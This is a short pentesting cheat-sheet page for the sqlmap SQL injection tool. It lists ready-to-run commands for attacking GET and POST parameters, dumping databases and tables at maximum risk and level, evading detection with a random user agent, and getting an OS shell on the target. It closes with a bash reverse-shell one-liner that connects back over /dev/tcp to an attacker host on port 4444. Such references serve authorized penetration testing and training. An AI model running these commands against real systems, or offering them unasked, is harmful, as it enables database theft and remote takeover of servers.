---
title: Sqlmap
desc: SQL injection automation tool.
tags: [ActiveRecon, Database, Linux, SQLi, Web]
alts: [Nmap, SQLInjectionCheatSheet]
website:
render_with_liquid: false
---

## GET Request

```sh
sqlmap -u "http://10.0.0.1/?search=test"
# -p: specify the parameter
sqlmap -u "http://10.0.0.1/?category=test&item=1" -p item 

# --technique=U: UNION attack
# --delay=2: Time Delay
sqlmap -u "http://vulnerable.com/?search=1" --cookie="token=3df28a..." --technique=U --delay=2 --dump
```

<br />

## POST Request

```sh
# --dbs: List all available databases
# --dump: Dump entries of database table
sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --dbs --dump

# --all: Retrieve all
sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --all

# --dbms: Set database system
sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --dbms=mysql

# --risk=3 (max)
# --level=5 (max)
sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --risk=3 --level=5 --dump

# Cookie (--cookie)
sqlmap -u "http://10.0.0.1" --cookie="value=*" --dbs --dump

# Random agent (--random-agent)
sqlmap -u "http://10.0.0.1" --data="username=test" --random-agent --dump

# --headers: custom HTTP header
sqlmap --headers="Cookie: value=1234" -u "http://10.0.0.1" --data="username=test&password=test" --dbs --dump
```

<br />

## POST Request (Specify the Request File)

```sh
# request.txt
POST /login HTTP/1.1
Host: 10.0.0.1

{"username":"*", "password": "*"}

# --------------------------------------------------------

sqlmap -r request.txt --risk=3 --level=5 --dump
```

<br />

## Web Shell (--os-shell)

```sh

sqlmap -u "http://10.0.0.1" --cookie="value=*" --os-shell

# ------ Activate --------------------------

# Reverse shell again to get the full functional shell
os-shell> bash -c 'bash -i >& /dev/tcp/10.0.0.2/4444 0>&1'
```